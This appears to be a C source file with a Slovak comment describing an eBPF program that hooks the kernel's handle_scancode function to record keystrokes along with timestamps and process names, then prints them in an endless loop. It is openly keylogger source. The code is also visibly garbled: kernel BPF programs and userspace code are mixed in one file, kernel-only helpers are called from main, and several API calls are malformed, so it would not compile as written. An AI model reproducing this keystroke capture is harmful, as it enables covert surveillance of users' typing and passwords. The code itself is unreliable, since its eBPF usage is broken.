/*Program využíva funkcie jadra Linuxu a knižnicu eBPF (extended Berkeley Packet Filter) na zachytenie udalostí stlačenia kláves na klávesnici. 
Program tiež zaznamenáva čas a názov procesu, ktorý spôsobil udalosť stlačenia kláves. */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <errno.h>
#include <bpf/bpf.h>

#define LOG_BUF_SIZE 65536

char _license[] SEC("license") = "GPL";

int _version SEC("version") = 1;

struct data_t {
    u64 ts;
    char comm[TASK_COMM_LEN];
    u32 keycode;
};

SEC("kprobe/handle_scancode")
int BPF_PROG(handle_scancode)(struct pt_regs *ctx, unsigned int set, unsigned int scancode, int down) {
    struct data_t data = {};
    data.ts = bpf_ktime_get_ns();
    bpf_get_current_comm(&data.comm, sizeof(data.comm));
    data.keycode = scancode;
    bpf_perf_event_output(ctx, &data, sizeof(data));
    return 0;
}

char _help[] SEC("help") = "Log key press events in the system.";

int _print_bpf_output(struct data_t *data) {
    printf("[%5llu.%06llu] %s: keycode %u pressed\n", data->ts / 1000000, data->ts % 1000000, data->comm, data->keycode);
    return 0;
}

SEC("kprobe/tracing_mark_write")
int _bpf_event_output(struct pt_regs *ctx) {
    struct data_t data;
    u32 pid, cpu;
    u64 ts;

    pid = bpf_get_current_pid_tgid();
    cpu = bpf_get_smp_processor_id();
    ts = bpf_ktime_get_ns();

    bpf_perf_event_read(&data, sizeof(data));
    bpf_trace_printk("[%d] %llu.%06llu: %s: keycode %u pressed\n", pid, ts / 1000000, ts % 1000000, data.comm, data.keycode);

    return 0;
}

int main(int argc, char **argv) {
    int key, pid, cpu;

    key = 0;
    pid = bpf_get_current_pid_tgid();
    cpu = bpf_get_smp_processor_id();

    // Open perf event
    int fd = bpf_perf_event_open(handle_scancode, -1, key, -1, 0);
    if (fd < 0) {
        printf("Error opening perf event: %d\n", fd);
        return -1;
    }

    // Attach kprobe to tracing_mark_write
    int res = bpf_attach_kprobe(fd, _bpf_event_output, "tracing_mark_write");
    if (res < 0) {
        printf("Error attaching kprobe: %d\n", res);
        return -1;
    }

    // Print output
    int num_events = 0;
    while (1) {
        struct data_t data;
        int res = read(fd, &data, sizeof(data));
        if (res < 0)
        {
            if (errno == EINTR)
            {
                continue;
            }
            printf("Error reading perf event: %d\n", res);
            return -1;
        }

        _print_bpf_output(&data);
        num_events++;
    }

    return 0;
}